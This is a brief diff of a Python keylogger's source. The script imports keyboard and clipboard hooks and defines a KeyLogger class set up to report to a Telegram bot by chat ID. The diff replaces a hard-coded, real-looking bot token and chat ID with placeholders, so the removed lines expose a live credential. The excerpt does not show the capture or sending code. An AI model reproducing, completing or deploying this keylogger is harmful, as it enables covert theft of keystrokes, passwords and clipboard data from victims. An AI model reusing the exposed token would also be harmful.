@@ -8,8 +8,8 @@ import win32clipboard
 from pynput import keyboard
 
 # Replace with your Telegram Bot Token and Chat ID
-TELEGRAM_BOT_TOKEN = '7293499633:AAED26sfAcr8VK0b59K96SgqH3-mIBVxiFo'
-TELEGRAM_CHAT_ID = '-4597801163'
+TELEGRAM_BOT_TOKEN = 'Replace with you bot id'
+TELEGRAM_CHAT_ID = 'Replace with you chat id'
 
 class KeyLogger:
     def __init__(self, time_interval, bot_token, chat_id):
